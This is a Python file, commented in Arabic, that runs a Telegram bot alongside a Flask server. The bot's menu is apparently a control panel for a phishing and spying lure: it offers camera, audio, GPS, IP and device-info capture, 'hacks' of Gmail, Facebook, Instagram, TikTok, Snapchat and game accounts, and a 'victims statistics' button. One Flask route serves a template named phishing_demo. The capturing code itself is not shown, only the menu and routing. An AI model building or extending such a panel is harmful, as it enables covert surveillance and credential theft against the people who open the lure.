from flask import Flask, render_template
import threading
import telebot
import os

# =======================
# إعداد البوت
# =======================
TOKEN = os.environ.get("BOT_TOKEN")
if not TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set!")

bot = telebot.TeleBot(TOKEN)

def master_keyboard():
    from telebot import types
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("📸 كاميرا أمامية (3 صور)", callback_data="photo"),
        types.InlineKeyboardButton("📸 كاميرا خلفية", callback_data="photo_back"),
        types.InlineKeyboardButton("🎙️ تسجيل صوتي مطول", callback_data="audio"),
        types.InlineKeyboardButton("📍 تحديد الموقع GPS", callback_data="location"),
        types.InlineKeyboardButton("📱 معلومات الجهاز كاملة", callback_data="specs"),
        types.InlineKeyboardButton("🌐 سحب عنوان الـ IP", callback_data="ip"),
        types.InlineKeyboardButton("📧 اختراق Gmail", callback_data="gmail"),
        types.InlineKeyboardButton("💬 اختراق واتساب (وهمي)", callback_data="whatsapp"),
        types.InlineKeyboardButton("📘 اختراق فيسبوك", callback_data="facebook"),
        types.InlineKeyboardButton("📸 اختراق انستقرام", callback_data="instagram"),
        types.InlineKeyboardButton("🎮 اختراق ببجي", callback_data="pubg"),
        types.InlineKeyboardButton("🔥 اختراق فري فاير", callback_data="ff"),
        types.InlineKeyboardButton("🎵 اختراق تيك توك", callback_data="tiktok"),
        types.InlineKeyboardButton("👻 اختراق سناب شات", callback_data="snap"),
        types.InlineKeyboardButton("🔋 فحص البطارية", callback_data="battery"),
        types.InlineKeyboardButton("⚙️ إعدادات الرابط", callback_data="setup")
    )
    m.add(types.InlineKeyboardButton("📊 إحصائيات الضحايا", callback_data="stats"))
    m.add(types.InlineKeyboardButton("💡 حول المطور", callback_data="about"))
    return m

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "🔥 *مرحباً بك في لوحة تحكم ALMEUNHREF V6*\n\nجاهز لبدء العمل؟", parse_mode="Markdown", reply_markup=master_keyboard())

# هنا ممكن تضيف أي Handlerات أخرى للبوت
# =====================================

# =======================
# إعداد Flask
# =======================
app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/phishing")
def phishing():
    return render_template("phishing_demo.html")

@app.route("/ip")
def ip():
    return render_template("ip.html")

@app.route("/defense")
def defense():
    return render_template("defense.html")

@app.route("/checklist")
def checklist():
    return render_template("checklist.html")

# =======================
# تشغيل Flask + البوت معًا
# =======================
def run_flask():
    app.run(host="0.0.0.0", port=10000)

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    # نبدأ البوت في Thread
    threading.Thread(target=run_bot, daemon=True).start()
    # نبدأ Flask
    run_flask()
